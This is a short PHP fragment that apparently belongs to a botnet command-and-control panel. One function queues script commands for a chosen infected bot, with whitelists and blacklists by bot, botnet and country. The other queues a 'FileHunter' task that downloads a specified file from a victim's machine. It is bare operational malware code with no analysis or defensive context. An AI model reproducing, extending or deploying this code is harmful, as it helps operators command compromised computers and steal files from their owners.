<?php
/** Add a simple Bot Script for a single bot
 * @param string	$botId		Bot ID
 * @param string	$name		Script name
 * @param string	$script		The script command
 * @param string	$send_limit	Send limit
 * @return bool True on success
 */
function add_simple_script($botId, $name, $script, $send_limit = 1, $extern_id = null){
	$q_extern_id = is_null($extern_id)? md5(microtime()) : mysql_escape_string($extern_id);
	$q_botIds = addslashes("\x01".$botId."\x01");
	$q_name = mysql_escape_string($name);
	$q_script = mysql_escape_string($script);
	$values = array(
		'""', # id
		"'$q_extern_id'", # extern_id
		"'$q_name'", # name
		1, # enabled
		time(), # time_created
		$send_limit, # send_limit
		"'$q_botIds'", "''", # bots_wl, bots_bl
		"''", "''", # botnets_wl, botnets_bl
		"''", "''", # countries_wl, countries_bl
		"'$q_script'", # script_text
		"'$q_script'", # script_bin
		);
	return (bool)mysql_query('INSERT INTO `botnet_scripts` VALUES('.implode(',', $values).');');
	}

/** Ask FileHunter to place a task for downloading a file
 * @param string $botId
 *      BotID
 * @param string $path
 *      The file to download
 * @param string $hash
 *      File hash. Optional.
 * @return bool True on success
 */
function filehunter_download_file($botId, $path, $hash = null){
    $i = (object)array(
        'botId' => mysql_real_escape_string($botId),
        'path'  => mysql_real_escape_string($path),
        'job'   => mysql_real_escape_string(json_encode(array('name' => 'download'))),
        'state' => mysql_real_escape_string('job'),
        'now'   => mysql_real_escape_string(time()),
        'hash'  => $hash? mysql_real_escape_string($hash) : null
    );

    return (bool)mysql_query(
        "INSERT INTO `botnet_rep_filehunter`
         SET
            `table`=0, `report_id`=0, `botnet`='', `botId`='{$i->botId}', `rtime`={$i->now}, `upd`={$i->now},
            `f_path`='{$i->path}', `f_size`=0, `f_hash`=". (is_null($i->hash)? 'NULL' : "'{$i->hash}'") .",
            `state`='{$i->state}', `job`='{$i->job}', `f_local`=NULL
        ;"
    );
}
